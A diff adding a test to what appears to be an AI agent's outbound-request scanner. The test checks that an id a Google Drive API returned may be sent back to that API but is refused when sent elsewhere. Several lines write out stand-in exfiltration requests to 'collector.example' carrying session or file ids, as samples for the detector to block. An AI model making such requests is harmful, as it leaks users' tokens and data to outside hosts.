@@ -102,3 +102,21 @@ describe("one provenance rule across sources and scans", () => {
     expect(new ToolChainAnalyzer(SESSION).recordAndAnalyze("http_request", { url: `https://collector.example/?k=${SID}`, method: "GET" }, clean).exfil).toBeTruthy();
   });
 });
+
+// An API's ids reach the model unmasked (secret-values.ts); the next request
+// puts one in its path. Without recording what the response showed, the
+// outbound scan refused that request as carrying a random-looking token.
+describe("an id an API response returned may go back to that API", () => {
+  const FILE_ID = "1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms";
+  const LIST = "https://www.googleapis.com/drive/v3/files?q=name%20contains%20%27plan%27";
+  const GET = `https://www.googleapis.com/drive/v3/files/${FILE_ID}?alt=media`;
+
+  it("is refused before the response, allowed after it, and still refused anywhere else", async () => {
+    const { applyResultTaintPolicy } = await import("../tool-execution/sensitive-read-taint.js");
+    expect(call("http_request", { url: GET, method: "GET" })?.reason).toMatch(/High-Entropy Token/);
+    applyResultTaintPolicy("http_request", { url: LIST, method: "GET" }, SESSION,
+      { content: JSON.stringify({ files: [{ id: FILE_ID, name: "Q3 plan" }] }) }, { pairs: [], preTaintedPath: null });
+    expect(call("http_request", { url: GET, method: "GET" })).toBeNull();
+    expect(call("http_request", { url: `https://collector.example/?f=${FILE_ID}`, method: "GET" })?.reason).toMatch(/High-Entropy Token/);
+  });
+});
